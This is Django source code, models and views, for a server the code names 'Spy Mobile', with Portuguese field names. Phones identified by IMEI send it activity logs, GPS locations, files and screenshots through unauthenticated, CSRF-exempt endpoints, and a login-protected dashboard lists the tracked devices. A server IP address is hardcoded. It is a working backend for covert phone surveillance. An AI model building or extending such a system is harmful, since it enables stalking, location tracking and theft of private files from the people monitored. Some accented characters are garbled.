from django.db import models
from django.utils import timezone

class Dispositivo(models.Model):
    imei = models.CharField(max_length=20, unique=True, db_index=True)
    ip = models.GenericIPAddressField()
    nome = models.CharField(max_length=100, blank=True)
    status = models.CharField(max_length=20, default='ativo')
    criado_em = models.DateTimeField(auto_now_add=True)
    ultima_conexao = models.DateTimeField(auto_now=True)
    bateria_nivel = models.IntegerField(null=True, blank=True)
    def __str__(self): return f"{self.nome or self.imei} ({self.ip})"

class Atividade(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='atividades')
    descricao = models.TextField()
    tipo = models.CharField(max_length=50, default='geral')
    data_hora = models.DateTimeField(auto_now_add=True, db_index=True)
    def __str__(self): return f"{self.dispositivo} - {self.data_hora}"

class Localizacao(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='localizacoes')
    latitude = models.FloatField()
    longitude = models.FloatField()
    data_hora = models.DateTimeField(auto_now_add=True, db_index=True)
    def __str__(self): return f"{self.dispositivo} - {self.latitude}, {self.longitude}"

class Arquivo(models.Model):
    dispositivo = models.ForeignKey(Dispositivo, on_delete=models.CASCADE, related_name='arquivos')
    nome_arquivo = models.CharField(max_length=255)
    tipo_arquivo = models.CharField(max_length=50)
    tamanho = models.BigIntegerField()
    arquivo = models.FileField(upload_to='uploads/%Y/%m/%d/')
    data_upload = models.DateTimeField(auto_now_add=True)
    def __str__(self): return f"{self.nome_arquivo}"
EOF

import json
from django.http import JsonResponse, HttpResponse
from django.shortcuts import render, get_object_or_404, redirect
from django.views.decorators.csrf import csrf_exempt
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login
from .models import Dispositivo, Atividade, Localizacao, Arquivo
from django.utils import timezone
from datetime import timedelta

@csrf_exempt
def api_test(request):
    return JsonResponse({'status': 'success', 'message': 'Spy Mobile VPS HTTPS OK!', 'timestamp': timezone.now().isoformat(), 'server': '147.79.111.118'})

@csrf_exempt
def api_atividade(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        descricao = data.get('descricao', 'Atividade autom√°tica')
        dispositivo, created = Dispositivo.objects.get_or_create(imei=imei, defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0'), 'nome': f'Dispositivo {imei[:8]}'})
        dispositivo.ultima_conexao = timezone.now()
        dispositivo.save()
        Atividade.objects.create(dispositivo=dispositivo, descricao=descricao, tipo=data.get('tipo', 'geral'))
        return JsonResponse({'status': 'success', 'device_id': dispositivo.id})
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
def api_localizacao(request):
    try:
        data = json.loads(request.body)
        imei = data.get('imei', 'dispositivo_desconhecido')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        if not latitude or not longitude: return JsonResponse({'error': 'Latitude e longitude obrigat√≥rias'}, status=400)
        dispositivo, created = Dispositivo.objects.get_or_create(imei=imei, defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')})
        Localizacao.objects.create(dispositivo=dispositivo, latitude=float(latitude), longitude=float(longitude))
        return JsonResponse({'status': 'success'})
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

@csrf_exempt
def api_upload(request):
    try:
        if 'arquivo' not in request.FILES and 'screenshot' not in request.FILES: return JsonResponse({'error': 'Nenhum arquivo'}, status=400)
        file = request.FILES.get('arquivo') or request.FILES.get('screenshot')
        imei = request.POST.get('imei', 'dispositivo_desconhecido')
        dispositivo, created = Dispositivo.objects.get_or_create(imei=imei, defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')})
        arquivo_obj = Arquivo.objects.create(dispositivo=dispositivo, nome_arquivo=file.name, tipo_arquivo=request.POST.get('tipo', 'arquivo'), tamanho=file.size, arquivo=file)
        return JsonResponse({'status': 'success', 'arquivo_id': arquivo_obj.id})
    except Exception as e:
        return JsonResponse({'error': str(e)}, status=400)

def home(request):
    dispositivos_count = Dispositivo.objects.count()
    atividades_count = Atividade.objects.count()
    dispositivos_ativos = Dispositivo.objects.filter(ultima_conexao__gte=timezone.now() - timedelta(hours=24)).count()
    context = {'dispositivos_count': dispositivos_count, 'atividades_count': atividades_count, 'dispositivos_ativos': dispositivos_ativos}
    return render(request, 'home.html', context)

@login_required
def lista_dispositivos(request):
    dispositivos = Dispositivo.objects.all().order_by('-ultima_conexao')
    return render(request, 'dispositivos.html', {'dispositivos': dispositivos})

def login_view(request):
    if request.method == 'POST':
        user = authenticate(request, username=request.POST.get('username'), password=request.POST.get('password'))
        if user: login(request, user); return redirect('home')
        else: return render(request, 'login.html', {'erro': 'Credenciais inv√°lidas'})
    return render(request, 'login.html')
EOF
